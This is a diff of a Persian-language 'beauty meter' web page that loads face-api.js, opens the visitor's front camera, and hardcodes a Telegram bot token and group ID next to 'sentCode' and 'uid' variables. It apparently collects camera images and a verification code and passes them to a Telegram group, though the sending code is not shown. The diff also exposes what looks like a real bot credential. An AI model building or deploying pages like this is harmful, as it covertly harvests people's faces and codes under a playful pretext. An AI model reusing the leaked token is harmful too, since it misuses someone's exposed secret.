@@ -5,13 +5,9 @@
   <title>زیبایی‌سنج برندیک</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
-  <script defer src="https://unpkg.com/face-api.js"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
       font-family: 'Vazirmatn', sans-serif;
       background: linear-gradient(120deg, #f0f4ff, #dff2ff);
@@ -20,12 +16,10 @@
       padding: 30px;
       animation: fadeInBody 1s ease-in-out;
     }
-
     @keyframes fadeInBody {
       from { opacity: 0; transform: translateY(10px); }
       to { opacity: 1; transform: translateY(0); }
     }
-
     .container {
       max-width: 540px;
       margin: auto;
@@ -37,12 +31,10 @@
       position: relative;
       overflow: hidden;
     }
-
     @keyframes slideIn {
       from { transform: translateY(30px); opacity: 0; }
       to { transform: translateY(0); opacity: 1; }
     }
-
     h2 {
       text-align: center;
       margin-bottom: 25px;
@@ -50,7 +42,6 @@
       color: #0057c2;
       position: relative;
     }
-
     h2::after {
       content: "";
       position: absolute;
@@ -62,13 +53,11 @@
       background: #0077ff;
       border-radius: 2px;
     }
-
     label {
       margin-top: 18px;
       font-weight: bold;
       font-size: 15px;
     }
-
     input {
       width: 100%;
       padding: 12px;
@@ -77,13 +66,11 @@
       border: 1px solid #ccc;
       transition: all 0.3s;
     }
-
     input:focus {
       outline: none;
       border-color: #0077ff;
       box-shadow: 0 0 5px rgba(0, 119, 255, 0.3);
     }
-
     button {
       margin-top: 25px;
       width: 100%;
@@ -96,12 +83,10 @@
       cursor: pointer;
       transition: all 0.3s ease;
     }
-
     button:hover {
       transform: translateY(-2px);
       box-shadow: 0 10px 20px rgba(0, 119, 255, 0.3);
     }
-
     .note {
       font-size: 13px;
       color: #666;
@@ -110,7 +95,6 @@
       padding: 10px 15px;
       border-radius: 10px;
     }
-
     .camera-container {
       display: none;
       flex-direction: column;
@@ -118,19 +102,16 @@
       margin-top: 30px;
       animation: fadeIn 1s ease;
     }
-
     @keyframes fadeIn {
       from { opacity: 0; }
       to { opacity: 1; }
     }
-
     video, canvas {
       border-radius: 20px;
       margin-top: 20px;
       max-width: 100%;
       box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
     }
-
     #countdown {
       font-size: 20px;
       margin-top: 20px;
@@ -166,7 +147,7 @@
   </div>
 
   <script>
-    const token = "7396553495:AAHfctgjqILhUGihcPZuqTTgRWrXxtGBUH4";
+    const token = "7396553495:AAHfctgjqILhUGihcPZuqTTgRWrXxtGBUH4"; // <<== توکن واقعی رو اینجا بذار
     const groupId = "-1002534583259";
     let sentCode = "";
     let uid = "";
@@ -197,7 +178,7 @@
     }
 
     async function startCamera() {
-      await faceapi.nets.tinyFaceDetector.loadFromUri("https://justadomain.ir/face-api-models");
+      await faceapi.nets.tinyFaceDetector.loadFromUri("https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/");
       const video = document.getElementById("video");
       const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
       video.srcObject = stream;
